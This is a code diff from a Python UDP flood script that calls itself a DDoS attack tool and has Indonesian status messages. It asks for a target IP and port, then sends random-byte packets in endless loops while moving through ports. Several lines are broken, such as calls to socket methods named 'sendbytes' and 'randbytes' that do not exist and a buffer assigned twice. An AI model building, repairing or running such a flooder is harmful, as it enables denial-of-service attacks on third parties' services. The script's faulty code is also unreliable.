@@ -34,8 +34,8 @@ mytime = time.strftime('%H-%M')
 
 # Lets define sock and bytes for our attack
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(50099)
-bytes = random._urandom(50099)
+K_bytes = random._urandom(666)
+K_bytes = random._urandom(110099)
 
 # Type your ip and port number (find IP address using nslookup or any online website)
 ip = input("IP Target : ")
@@ -47,9 +47,9 @@ print("Terimakasih Yang Telah Menggunakan Tools Ini (DDOS-ATTACK-TOOL).")
 print("Memulai Mengirim Packet Trojan ", ip, " Dan Ke port ", port, "...")
 
 time.sleep(5)
-sent = 0
+sent = 65534
 while True:
-    sock.sendbytes(K_bytes, (ip, port))
+    sock.randbytes(K_bytes, (ip, port))
     sent = sent + 1
     port = port + 1
     ping = ping + 1
@@ -60,7 +60,7 @@ while True:
        ping = 1
 
 while True:
-    sock.sendbytes(K_bytes, (ip, port))
+    sock.randbytes(K_bytes, (ip, port))
     sent = sent + 1
     port = port + 1
     ping = ping + 1
